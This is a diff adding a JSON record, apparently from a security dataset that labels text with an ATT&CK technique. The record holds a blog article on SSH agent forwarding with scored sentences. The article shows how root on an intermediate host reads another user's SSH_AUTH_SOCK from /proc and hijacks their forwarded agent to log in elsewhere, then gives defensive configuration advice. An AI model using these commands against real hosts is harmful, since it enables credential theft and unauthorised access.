@@ -1,0 +1,172 @@
+{
+  "original_txt": "When ForwardAgent Can’t Be Trusted\nSSH without passwords makes life with Unix-like operating systems much easier. If your network requires chained ssh sessions (to access a restricted network, for example), agent forwarding becomes extremely helpful. With agent forwarding it’s possible for me to connect from my laptop to my dev server and from there run an svn checkout from yet another server, all without passwords, while keeping my private key safe on my local workstation.\nThis can be dangerous, though. A quick web search will reveal several articles indicating this is only safe if the intermediate hosts are trustworthy. Rarely, however, will you find an explanation of why it’s dangerous.\nThat’s what this article is for. But first, some background.\nHow Passwordless Authentication Works\nWhen authenticating in normal mode, SSH uses your password to prove that you are who you say you are. The server compares a hash of this password to one it has on file, verifies that the hashes match, and lets you in.\nIf an attacker is able to break the encryption used to protect your password while it’s being sent to the server, they can steal the it and log in as you whenever they desire. If an attacker is allowed to perform hundreds of thousands of attempts, they can eventually guess your password.\nA much safer authentication method is public key authentication, a way of logging in without a password. Public key authentication requires a matched pair of public and private keys. The public key encrypts messages that can only be decrypted with the private key. The remote computer uses its copy of your public key to encrypt a secret message to you. You prove you are you by decrypting the message using your private key and sending the message back to the remote computer. Your private key remains safely on your local computer the entire time, safe from attack.\nThe private key is valuable and must be protected, so by default it is stored in an encrypted format. Unfortunately this means entering your encryption passphrase before using it. Many articles suggest using passphrase-less (unencrypted) private keys to avoid this inconvenience. That’s a bad idea, as anyone with access to your workstation (via physical access, theft, or hackery) now also has free access to any computers configured with your public key.\nOpenSSH includes ssh-agent, a daemon that runs on your local workstation. It loads a decrypted copy of your private key into memory, so you only have to enter your passphrase once. It then provides a local socket that the ssh client can use to ask it to decrypt the encrypted message sent back by the remote server. Your private key stays safely ensconced in the ssh-agent process’ memory while still allowing you to ssh around without typing in passwords.\nHow ForwardAgent Works\nMany tasks require “chaining” ssh sessions. Consider my example from earlier: I ssh from my workstation to the dev server. While there, I need to perform an svn update, using the “svn+ssh” protocol. Since it would be silly to leave an unencrypted copy of my super-secret private key on a shared server, I’m now stuck with password authentication. If, however, I enabled “ForwardAgent” in the ssh config on my workstation, ssh uses its built-in tunneling capabilities to create another socket on the dev server that is tunneled back to the ssh-agent socket on my local workstation. This means that the ssh client on the dev server can now send “decrypt this secret message” requests directly back to the ssh-agent running on my workstation, authenticating itself to the svn server without ever having access to my private key.\nWhy This Can Be Dangerous\nSimply put, anyone with root privilege on the the intermediate server can make free use of your ssh-agent to authenticate them to other servers. A simple demonstration shows how trivially this can be done. Hostnames and usernames have been changed to protect the innocent.\nMy laptop is running ssh-agent, which communicates with the ssh client programs via a socket. The path to this socket is stored in the SSH_AUTH_SOCK environment variable:\nmylaptop:~ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners srwx------ 1 alice wheel 0 Apr 3 11:04 /tmp/launch-oQKpeY/Listeners\nThe ssh-add program lets us view and interact with keys in the agent:\nmylaptop:~ alice$ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)\nI have “ForwardAgent yes” in the ~/.ssh/config on my laptop. So ssh is going to create a tunnel connecting the local socket to a local socket on the remote server:\nmylaptop:~ alice$ ssh seattle seattle:~ $ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990\nEven though my keys are not installed on “seattle”, the ssh client programs are still able to access the agent running on my local machine:\nseattle:~ alice $ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)\nSo… who can we mess with?\nseattle:~ alice $ who alice pts/0 2012-04-06 18:24 (office.example.com) bob pts/1 2012-04-03 01:29 (office.example.com) alice pts/3 2012-04-06 18:31 (office.example.com) alice pts/5 2012-04-06 18:31 (office.example.com) alice pts/6 2012-04-06 18:33 (office.example.com) charlie pts/23 2012-04-06 13:10 (office.example.com) charlie pts/27 2012-04-03 12:32 (office.example.com) bob pts/29 2012-04-02 10:58 (office.example.com)\nI’ve never liked Bob. To find his agent connection, I need to find the child process of one of his ssh sessions:\nseattle:~ alice $ sudo -s [sudo] password for alice: seattle:~ root # pstree -p bob sshd(16816)───bash(16817) sshd(25296)───bash(25297)───vim(14308)\nThere are several ways for root to view the environment of a running process. On Linux, the data is available in /proc/<pid>/environ. Since it’s stored in NULL-terminated strings, I’ll use tr to convert the NULLs to newlines:\nseattle:~ root # tr '�' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816\nI now have everything I need to know in order to hijack Bob’s ssh-agent:\nseattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l 2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)\nIf I happen to have a specific target in mind, I should now be able to connect directly. Otherwise, just watching the process list or grepping through Bob’s history file should present plenty of targets of opportunity. In this case, I know Bob has all sorts of super secret files stored on the server named “boston”:\nseattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston bob@boston:~$ whoami bob\nI have succesfully parlayed my root privileges on “seattle” to access as bob on “boston”. I’ll bet I can use that to get him fired.\nProtect Yourself!\nDon’t let your ssh-agent store your keys indefinitely. On OS X, configure your Keychain to lock after inactivity or when your screen locks. On other Unix-y platforms, pass the -t option to ssh-agent so its keys will be removed after seconds.\nDon’t enable agent forwarding when connecting to untrustworthy hosts. Fortunately, the ~/.ssh/config syntax makes this fairly simple:\nHost trustworthyhost ForwardAgent yes\nHost * ForwardAgent no\nRecommended Reading\n- OpenSSH key management – Daniel Robbins\n- An Illustrated Guide to SSH Agent Forwarding – Steve Friedl\n- ssh-agent manual\n- ssh-add manual",
+  "sanitized_txt": "When ForwardAgent Can’t Be Trusted SSH without passwords makes life with Unix-like operating systems much easier. If your network requires chained ssh sessions (to access a restricted network, for example), agent forwarding becomes extremely helpful. With agent forwarding it’s possible for me to connect from my laptop to my dev server and from there run an svn checkout from yet another server, all without passwords, while keeping my private key safe on my local workstation.\nThis can be dangerous, though. A quick web search will reveal several articles indicating this is only safe if the intermediate hosts are trustworthy. Rarely, however, will you find an explanation of why it’s dangerous.\nThat’s what this article is for. But first, some background.\nHow Passwordless Authentication Works When authenticating in normal mode, SSH uses your password to prove that you are who you say you are. The server compares a hash of this password to one it has on file, verifies that the hashes match, and lets you in.\nIf an attacker is able to break the encryption used to protect your password while it’s being sent to the server, they can steal the it and log in as you whenever they desire. If an attacker is allowed to perform hundreds of thousands of attempts, they can eventually guess your password.\nA much safer authentication method is public key authentication, a way of logging in without a password. Public key authentication requires a matched pair of public and private keys. The public key encrypts messages that can only be decrypted with the private key. The remote computer uses its copy of your public key to encrypt a secret message to you. You prove you are you by decrypting the message using your private key and sending the message back to the remote computer. Your private key remains safely on your local computer the entire time, safe from attack.\nThe private key is valuable and must be protected, so by default it is stored in an encrypted format. Unfortunately this means entering your encryption passphrase before using it. Many articles suggest using passphrase-less (unencrypted) private keys to avoid this inconvenience. That’s a bad idea, as anyone with access to your workstation (via physical access, theft, or hackery) now also has free access to any computers configured with your public key.\nOpenSSH includes ssh-agent, a daemon that runs on your local workstation. It loads a decrypted copy of your private key into memory, so you only have to enter your passphrase once. It then provides a local socket that the ssh client can use to ask it to decrypt the encrypted message sent back by the remote server. Your private key stays safely ensconced in the ssh-agent process’ memory while still allowing you to ssh around without typing in passwords.\nHow ForwardAgent Works Many tasks require “chaining” ssh sessions. Consider my example from earlier: I ssh from my workstation to the dev server. While there, I need to perform an svn update, using the “svn+ssh” protocol. Since it would be silly to leave an unencrypted copy of my super-secret private key on a shared server, I’m now stuck with password authentication. If, however, I enabled “ForwardAgent” in the ssh config on my workstation, ssh uses its built-in tunneling capabilities to create another socket on the dev server that is tunneled back to the ssh-agent socket on my local workstation. This means that the ssh client on the dev server can now send “decrypt this secret message” requests directly back to the ssh-agent running on my workstation, authenticating itself to the svn server without ever having access to my private key.\nWhy This Can Be Dangerous Simply put, anyone with root privilege on the the intermediate server can make free use of your ssh-agent to authenticate them to other servers. A simple demonstration shows how trivially this can be done. Hostnames and usernames have been changed to protect the innocent.\nMy laptop is running ssh-agent, which communicates with the ssh client programs via a socket. The path to this socket is stored in the SSH_AUTH_SOCK environment variable:\nmylaptop:~ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners srwx------ 1 alice wheel 0 Apr 3 11:04 /tmp/launch-oQKpeY/Listeners The ssh-add program lets us view and interact with keys in the agent:\nmylaptop:~ alice$ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA) I have “ForwardAgent yes” in the ~/.ssh/config on my laptop. So ssh is going to create a tunnel connecting the local socket to a local socket on the remote server:\nmylaptop:~ alice$ ssh seattle seattle:~ $ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990 Even though my keys are not installed on “seattle”, the ssh client programs are still able to access the agent running on my local machine:\nseattle:~ alice $ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA) So… who can we mess with?\nseattle:~ alice $ who alice pts/0 2012-04-06 18:24 (office.example.com) bob pts/1 2012-04-03 01:29 (office.example.com) alice pts/3 2012-04-06 18:31 (office.example.com) alice pts/5 2012-04-06 18:31 (office.example.com) alice pts/6 2012-04-06 18:33 (office.example.com) charlie pts/23 2012-04-06 13:10 (office.example.com) charlie pts/27 2012-04-03 12:32 (office.example.com) bob pts/29 2012-04-02 10:58 (office.example.com) I’ve never liked Bob. To find his agent connection, I need to find the child process of one of his ssh sessions:\nseattle:~ alice $ sudo -s [sudo] password for alice: seattle:~ root # pstree -p bob sshd(16816)───bash(16817) sshd(25296)───bash(25297)───vim(14308) There are several ways for root to view the environment of a running process. On Linux, the data is available in /proc/<pid>/environ. Since it’s stored in NULL-terminated strings, I’ll use tr to convert the NULLs to newlines:\nseattle:~ root # tr '�' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 I now have everything I need to know in order to hijack Bob’s ssh-agent:\nseattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l 2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA) If I happen to have a specific target in mind, I should now be able to connect directly. Otherwise, just watching the process list or grepping through Bob’s history file should present plenty of targets of opportunity. In this case, I know Bob has all sorts of super secret files stored on the server named “boston”:\nseattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston bob@boston:~$ whoami bob I have succesfully parlayed my root privileges on “seattle” to access as bob on “boston”. I’ll bet I can use that to get him fired.\nProtect Yourself!\nDon’t let your ssh-agent store your keys indefinitely. On OS X, configure your Keychain to lock after inactivity or when your screen locks. On other Unix-y platforms, pass the -t option to ssh-agent so its keys will be removed after seconds.\nDon’t enable agent forwarding when connecting to untrustworthy hosts. Fortunately, the ~/.ssh/config syntax makes this fairly simple:\nHost trustworthyhost ForwardAgent yes Host * ForwardAgent no Recommended Reading - OpenSSH key management – Daniel Robbins - An Illustrated Guide to SSH Agent Forwarding – Steve Friedl - ssh-agent manual - ssh-add manual",
+  "ID_list": [
+    "T1563.001"
+  ],
+  "Name_list": [
+    "Keychain",
+    "Private Keys",
+    "Sudo"
+  ],
+  "TTP_sentences": {
+    "T1563.001": [
+      {
+        "sentence": "When ForwardAgent Can’t Be Trusted SSH without passwords makes life with Unix-like operating systems much easier.",
+        "score": 0.7564
+      },
+      {
+        "sentence": "If your network requires chained ssh sessions (to access a restricted network, for example), agent forwarding becomes extremely helpful.",
+        "score": 0.7209
+      },
+      {
+        "sentence": "With agent forwarding it’s possible for me to connect from my laptop to my dev server and from there run an svn checkout from yet another server, all without passwords, while keeping my private key safe on my local workstation.",
+        "score": 0.6002
+      },
+      {
+        "sentence": "A quick web search will reveal several articles indicating this is only safe if the intermediate hosts are trustworthy.",
+        "score": 0.4969
+      },
+      {
+        "sentence": "Rarely, however, will you find an explanation of why it’s dangerous.",
+        "score": 0.3744
+      },
+      {
+        "sentence": "But first, some background.",
+        "score": 0.336
+      },
+      {
+        "sentence": "How Passwordless Authentication Works When authenticating in normal mode, SSH uses your password to prove that you are who you say you are.",
+        "score": 0.6498
+      },
+      {
+        "sentence": "The server compares a hash of this password to one it has on file, verifies that the hashes match, and lets you in.",
+        "score": 0.4207
+      },
+      {
+        "sentence": "If an attacker is able to break the encryption used to protect your password while it’s being sent to the server, they can steal the it and log in as you whenever they desire.",
+        "score": 0.5769
+      },
+      {
+        "sentence": "If an attacker is allowed to perform hundreds of thousands of attempts, they can eventually guess your password.",
+        "score": 0.405
+      },
+      {
+        "sentence": "A much safer authentication method is public key authentication, a way of logging in without a password.",
+        "score": 0.6246
+      },
+      {
+        "sentence": "Public key authentication requires a matched pair of public and private keys.",
+        "score": 0.4659
+      },
+      {
+        "sentence": "The public key encrypts messages that can only be decrypted with the private key.",
+        "score": 0.3933
+      },
+      {
+        "sentence": "The remote computer uses its copy of your public key to encrypt a secret message to you.",
+        "score": 0.4008
+      },
+      {
+        "sentence": "You prove you are you by decrypting the message using your private key and sending the message back to the remote computer.",
+        "score": 0.3756
+      },
+      {
+        "sentence": "Your private key remains safely on your local computer the entire time, safe from attack.",
+        "score": 0.3257
+      },
+      {
+        "sentence": "The private key is valuable and must be protected, so by default it is stored in an encrypted format.",
+        "score": 0.3735
+      },
+      {
+        "sentence": "Unfortunately this means entering your encryption passphrase before using it.",
+        "score": 0.3802
+      },
+      {
+        "sentence": "Many articles suggest using passphrase-less (unencrypted) private keys to avoid this inconvenience.",
+        "score": 0.5022
+      },
+      {
+        "sentence": "That’s a bad idea, as anyone with access to your workstation (via physical access, theft, or hackery) now also has free access to any computers configured with your public key.",
+        "score": 0.4915
+      },
+      {
+        "sentence": "OpenSSH includes ssh-agent, a daemon that runs on your local workstation.",
+        "score": 0.4842
+      },
+      {
+        "sentence": "It then provides a local socket that the ssh client can use to ask it to decrypt the encrypted message sent back by the remote server.",
+        "score": 0.5087
+      },
+      {
+        "sentence": "Your private key stays safely ensconced in the ssh-agent process’ memory while still allowing you to ssh around without typing in passwords.",
+        "score": 0.6261
+      },
+      {
+        "sentence": "How ForwardAgent Works Many tasks require “chaining” ssh sessions.",
+        "score": 0.6466
+      },
+      {
+        "sentence": "Consider my example from earlier: I ssh from my workstation to the dev server.",
+        "score": 0.7434
+      },
+      {
+        "sentence": "While there, I need to perform an svn update, using the “svn+ssh” protocol.",
+        "score": 0.5161
+      },
+      {
+        "sentence": "Since it would be silly to leave an unencrypted copy of my super-secret private key on a shared server, I’m now stuck with password authentication.",
+        "score": 0.5445
+      },
+      {
+        "sentence": "If, however, I enabled “ForwardAgent” in the ssh config on my workstation, ssh uses its built-in tunneling capabilities to create another socket on the dev server that is tunneled back to the ssh-agent socket on my local workstation.",
+        "score": 0.6475
+      },
+      {
+        "sentence": "This means that the ssh client on the dev server can now send “decrypt this secret message” requests directly back to the ssh-agent running on my workstation, authenticating itself to the svn server without ever having access to my private key.",
+        "score": 0.5706
+      },
+      {
+        "sentence": "Why This Can Be Dangerous Simply put, anyone with root privilege on the the intermediate server can make free use of your ssh-agent to authenticate them to other servers.",
+        "score": 0.7219
+      },
+      {
+        "sentence": "Hostnames and usernames have been changed to protect the innocent.",
+        "score": 0.4171
+      },
+      {
+        "sentence": "My laptop is running ssh-agent, which communicates with the ssh client programs via a socket.",
+        "score": 0.6713
+      },
+      {
+        "sentence": "To find his agent connection, I need to find the child process of one of his ssh sessions: seattle:~ alice $ sudo -s [sudo] password for alice: seattle:~ root # pstree -p bob sshd(16816)───bash(16817) sshd(25296)───bash(25297)───vim(14308) There are several ways for root to view the environment of a running process.",
+        "score": 0.5572
+      },
+      {
+        "sentence": "Otherwise, just watching the process list or grepping through Bob’s history file should present plenty of targets of opportunity.",
+        "score": 0.3212
+      },
+      {
+        "sentence": "In this case, I know Bob has all sorts of super secret files stored on the server named “boston”: seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston bob@boston:~$ whoami bob I have succesfully parlayed my root privileges on “seattle” to access as bob on “boston”.",
+        "score": 0.6113
+      },
+      {
+        "sentence": "Don’t let your ssh-agent store your keys indefinitely.",
+        "score": 0.49
+      },
+      {
+        "sentence": "On other Unix-y platforms, pass the -t option to ssh-agent so its keys will be removed after seconds.",
+        "score": 0.4635
+      },
+      {
+        "sentence": "Don’t enable agent forwarding when connecting to untrustworthy hosts.",
+        "score": 0.5659
+      },
+      {
+        "sentence": "Fortunately, the ~/.ssh/config syntax makes this fairly simple: Host trustworthyhost ForwardAgent yes Host * ForwardAgent no Recommended Reading - OpenSSH key management – Daniel Robbins - An Illustrated Guide to SSH Agent Forwarding – Steve Friedl - ssh-agent manual - ssh-add manual",
+        "score": 0.6273
+      }
+    ]
+  }
+}
